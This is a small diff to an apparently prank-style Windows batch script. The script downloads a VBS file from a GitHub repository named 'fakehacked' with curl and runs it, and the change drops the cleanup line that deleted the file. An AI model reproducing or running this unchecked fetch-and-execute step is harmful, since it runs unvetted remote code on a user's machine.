@@ -5,7 +5,6 @@ set "URL=https://raw.githubusercontent.com/ert11er/fakehacked/main/TEMP.vbs"
 set "output=Temp.vbs"
 curl %URL% -o %output%
 start %output%
-del %output
 
 exit
 
